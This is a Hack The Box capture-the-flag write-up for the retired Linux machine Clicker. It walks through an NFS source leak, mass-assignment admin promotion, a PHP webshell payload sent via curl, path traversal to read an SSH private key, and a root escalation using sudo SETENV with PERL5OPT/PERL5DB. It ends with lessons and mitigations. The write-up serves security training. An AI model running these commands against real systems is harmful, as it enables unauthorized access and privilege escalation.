---
machine: Clicker
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, nfs, mass-assignment, webshell, setuid, perl, privesc]
---

# Clicker — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `backups` NFS share exposes source code. Mass assignment changes the role to admin and a file write gives a `www-data` webshell. The SUID `execute_query` binary, which runs as `jack`, reads his SSH key through traversal; `jack` can run `monitor.sh` as root with `SETENV`, and `PERL5OPT`/`PERL5DB` inject code into `xml_pp`.

## Recon

```bash
nmap -Pn -sCV -p22,80,111,2049 <IP>
showmount -e clicker.htb
```

- `22` SSH, `80` Apache and NFS on `111`/`2049`.
- The site redirects to `clicker.htb` and has registration, login and a game.
- `showmount` lists the `backups` share.

## Enumeration

Mount the share and unzip the backup, which contains the site's PHP source.

```bash
mkdir /mnt/clicker && mount -t nfs clicker.htb:/mnt/backups /mnt/clicker
unzip /mnt/clicker/*.zip
```

Registration accepts a `role` field. The filter can be bypassed with a newline or SQLi, and the object is updated through mass assignment.

## Foothold

With the account promoted to admin, reach `admin.php`. The app writes the nickname into a file under the webroot; send a PHP webshell and run it as `www-data`.

```bash
curl 'http://clicker.htb/admin.php' --data-urlencode 'nickname=<?php system($_GET["c"]); ?>'
```

## Lateral movement

`/opt/manage/execute_query` is SUID `jack` and runs `mysql` with an SQL file. The default case accepts a path and allows traversal; read `jack`'s private key and log in over SSH.

```bash
./execute_query 223 ../../../home/jack/.ssh/id_rsa
ssh -i jack.key jack@clicker.htb
```

## Privilege escalation

`jack` can run `/opt/monitor.sh` as root with `SETENV`. The script calls `xml_pp`, a Perl program, and preserves environment variables. `PERL5OPT=-d` enables the debugger and `PERL5DB` runs code before the program.

```bash
sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/root; chmod 6777 /tmp/root")' /opt/monitor.sh
/tmp/root -p
```

An HTTP proxy with XXE against `diagnostic.php` and `LD_PRELOAD` also work.

## Evidence

- NFS `backups` with source.
- Mass assignment and webshell.
- SUID `execute_query` and `jack`'s key.
- `monitor.sh` with `SETENV`.
- `PERL5OPT`/`PERL5DB` and root.

## Lessons learned

- A backup NFS share can leak the entire application.
- Filtering one field does not prevent mass assignment.
- A SUID binary running a SQL client can read the user's files.
- `SETENV` in sudoers turns environment variables into execution.

## Mitigation and detection

- Restrict NFS by host and keep code out of backups.
- Use allowlists for fields and roles.
- Review SUID binaries and avoid `system()` with controlled paths.
- Do not use `SETENV`; clear `PERL5OPT`, `PERL5DB` and `LD_PRELOAD`.

## References

- [0xdf — Clicker](https://0xdf.gitlab.io/2024/01/27/htb-clicker.html)
- [IppSec — Clicker](https://www.youtube.com/watch?v=8IkHQ84lmPI)
- [Hack The Box — Clicker](https://app.hackthebox.com/machines/clicker)
